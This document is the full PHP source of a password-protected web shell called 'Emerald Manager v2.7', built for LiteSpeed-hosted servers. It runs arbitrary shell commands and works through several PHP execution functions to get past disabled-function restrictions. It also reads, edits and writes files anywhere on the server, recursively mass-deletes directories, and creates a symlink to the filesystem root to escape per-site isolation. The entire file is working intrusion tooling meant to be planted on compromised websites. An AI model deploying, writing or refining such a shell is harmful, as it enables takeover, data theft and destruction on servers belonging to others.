<?php
/**
 * EMERALD MANAGER v2.7 - LiteSpeed Specialist
 * Features: Multi-CMD Bypass, Mass Delete, Editor, Symlink, Green Elegant UI
 */
session_start();

// --- KONFIGURASI ---
$password = 'vie1337sec'; // PASSWORD ANDA
$session_name = 'emerald_auth';

// --- LOGIKA LOGIN ---
if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
if (isset($_POST['p']) && $_POST['p'] === $password) { $_SESSION[$session_name] = true; }

if (!isset($_SESSION[$session_name])) {
    die('<html><head><title>Access Denied</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{background:#0b0e0d;color:#0f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;}.l-box{background:#111a16;padding:35px;border-radius:15px;box-shadow:0 0 20px #0f83;text-align:center;border:1px solid #1f3a2f;}input{padding:12px;border-radius:5px;border:1px solid #1f3a2f;background:#0b0e0d;color:#0f8;margin:10px 0;width:100%;text-align:center;}button{background:#008f58;color:#fff;border:none;padding:12px;border-radius:5px;cursor:pointer;width:100%;font-weight:bold;}</style></head><body><div class="l-box"><h2>EMERALD ACCESS</h2><form method="POST"><input type="password" name="p" placeholder="Enter Password" autofocus><button type="submit">LOGIN</button></form></div></body></html>');
}

// --- LOGIKA BYPASS TERMINAL ---
function emerald_cmd($cmd) {
    $out = '';
    $funcs = array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open');
    foreach ($funcs as $f) {
        if (function_exists($f)) {
            if ($f == 'exec') { @$f($cmd, $r); $out = join("\n", $r); }
            elseif ($f == 'popen') { $h = @$f($cmd, 'r'); if($h){ while(!feof($h)){ $out .= fread($h, 1024); } pclose($h); } }
            elseif ($f == 'proc_open') {
                $d = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
                $p = @proc_open($cmd, $d, $pipes);
                if (is_resource($p)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); @proc_close($p); }
            } else { ob_start(); @$f($cmd); $out = ob_get_clean(); }
            if (!empty($out)) return $out;
        }
    }
    return ($out) ? $out : "FAIL: Binary execution is strictly blocked by server (CageFS/LVE).";
}

// --- PENGATURAN DIREKTORI ---
$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
$dir = str_replace('\\', '/', $dir);
@chdir($dir);
$dir = getcwd();

// --- OPERASI FILE ---
$msg = ''; $cmd_out = '';
$f_get = 'file_get_contents';
$f_put = 'file_put_contents';

function del_item($path) {
    if (is_dir($path)) {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file) { del_item("$path/$file"); }
        return @rmdir($path);
    }
    return @unlink($path);
}

// Handle POST Actions
if (isset($_POST['cmd'])) { $cmd_out = emerald_cmd($_POST['cmd']); }
if (isset($_POST['act'])) {
    if ($_POST['act'] == 'save') { if(@$f_put($_POST['fn'], $_POST['content']) !== false) $msg = "File Saved: " . $_POST['fn']; }
    if ($_POST['act'] == 'mkdir') { if(@mkdir($_POST['fn'])) $msg = "Folder Created."; }
    if ($_POST['act'] == 'mass_delete' && isset($_POST['items'])) {
        foreach ($_POST['items'] as $item) { del_item($item); }
        $msg = "Mass delete success.";
    }
}
if (isset($_GET['rm'])) { if(del_item($_GET['rm'])) $msg = "Deleted: " . $_GET['rm']; }
if (isset($_GET['sym'])) { if(@symlink("/", "root_symlink")) $msg = "Symlink Created! Check folder 'root_symlink'"; }

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Emerald Manager v2.7</title>
    <style>
        :root { --green: #00ff88; --dark: #111a16; --bg: #0b0e0d; --border: #1f3a2f; }
        body { background: var(--bg); color: #ccc; font-family: 'Consolas', monospace; margin: 0; display: flex; }
        .sidebar { width: 300px; background: var(--dark); border-right: 1px solid var(--border); height: 100vh; position: fixed; padding: 25px; box-sizing: border-box; overflow-y: auto; }
        .content { margin-left: 300px; width: 100%; padding: 30px; }
        .card { background: #111; border: 1px solid var(--border); padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        h3 { color: var(--green); margin-top: 0; font-size: 14px; text-transform: uppercase; }
        input, textarea { background: #000; border: 1px solid var(--border); color: var(--green); padding: 10px; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
        .btn { background: #008f58; color: #fff; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 4px; }
        .btn:hover { background: var(--green); color: #000; }
        .btn-rm { background: #800; } .btn-rm:hover { background: #f00; color: #fff; }
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; color: #666; padding: 10px; border-bottom: 2px solid var(--border); }
        td { padding: 8px 10px; border-bottom: 1px solid #16241e; }
        .link { color: var(--green); text-decoration: none; }
        pre { background: #000; color: var(--green); padding: 15px; border: 1px solid var(--green); overflow: auto; max-height: 400px; }
    </style>
</head>
<body>

<div class="sidebar">
    <h2 style="color:var(--green)">EMERALD 2.7</h2>
    <div class="card">
        <h3>Command Line</h3>
        <form method="POST">
            <input type="text" name="cmd" placeholder="ls -la / whoami" required>
            <button type="submit" class="btn">EXECUTE</button>
        </form>
    </div>
    <div class="card">
        <h3>Tools</h3>
        <form method="POST">
            <input type="hidden" name="act" value="mkdir">
            <input type="text" name="fn" placeholder="New Folder">
            <button type="submit" class="btn">MKDIR</button>
        </form>
        <hr style="border:0; border-top:1px solid var(--border); margin:15px 0;">
        <a href="?d=<?= urlencode($dir) ?>&sym=1" class="btn" style="display:block; text-align:center; text-decoration:none; background:#444;">CREATE SYMLINK</a>
        <a href="?logout=1" class="btn btn-rm" style="display:block; text-align:center; text-decoration:none; margin-top:10px;">LOGOUT</a>
    </div>
</div>

<div class="content">
    <?php if($msg) echo "<div class='card' style='border-color:var(--green); color:var(--green);'>$msg</div>"; ?>
    
    <div class="card">
        <strong>Path:</strong> <span style="color:var(--green)"><?= htmlspecialchars($dir) ?></span>
    </div>

    <?php if($cmd_out): ?>
    <div class="card">
        <h3>Output</h3>
        <pre><?= htmlspecialchars($cmd_out) ?></pre>
    </div>
    <?php endif; ?>

    <div class="card">
        <form method="POST" onsubmit="return confirm('Mass Delete?')">
            <input type="hidden" name="act" value="mass_delete">
            <h3>Explorer 
                <button type="submit" class="btn btn-rm" style="width:auto; float:right; padding:5px 15px; font-size:11px; margin:0;">DELETE SELECTED</button>
            </h3>
            <table>
                <thead>
                    <tr>
                        <th width="30"><input type="checkbox" onclick="for(c of document.getElementsByName('items[]')) c.checked=this.checked"></th>
                        <th>Name</th>
                        <th>Type</th>
                        <th width="120">Action</th>
                    </tr>
                </thead>
                <tbody>
                    <tr><td></td><td><a href="?d=<?= urlencode(dirname($dir)) ?>" class="link">.. [ Parent ]</a></td><td>DIR</td><td>-</td></tr>
                    <?php
                    $items = scandir('.');
                    $folders = []; $files = [];
                    foreach($items as $i) {
                        if($i == '.' || $i == '..') continue;
                        is_dir($i) ? $folders[]=$i : $files[]=$i;
                    }
                    sort($folders); sort($files);
                    foreach($folders as $f) {
                        echo "<tr><td><input type='checkbox' name='items[]' value='".htmlspecialchars($f)."'></td><td><a href='?d=".urlencode($dir."/".$f)."' class='link'>📁 ".htmlspecialchars($f)."</a></td><td>DIR</td><td><a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' class='link' style='color:red' onclick='return confirm(\"Del?\")'>RM</a></td></tr>";
                    }
                    foreach($files as $f) {
                        echo "<tr><td><input type='checkbox' name='items[]' value='".htmlspecialchars($f)."'></td><td>📄 ".htmlspecialchars($f)."</td><td>FILE</td><td><a href='?d=".urlencode($dir)."&e=".urlencode($f)."' class='link' style='color:#00d2ff'>EDIT</a> | <a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' class='link' style='color:red' onclick='return confirm(\"Del?\")'>RM</a></td></tr>";
                    }
                    ?>
                </tbody>
            </table>
        </form>
    </div>

    <div class="card">
        <h3>Editor / New File</h3>
        <form method="POST">
            <input type="hidden" name="act" value="save">
            <input type="text" name="fn" placeholder="name.php" value="<?= isset($_GET['e']) ? htmlspecialchars($_GET['e']) : '' ?>">
            <textarea name="content" rows="15"><?php if(isset($_GET['e'])) echo htmlspecialchars($f_get($_GET['e'])); ?></textarea>
            <button type="submit" class="btn">SAVE FILE</button>
        </form>
    </div>
</div>

</body>
</html>
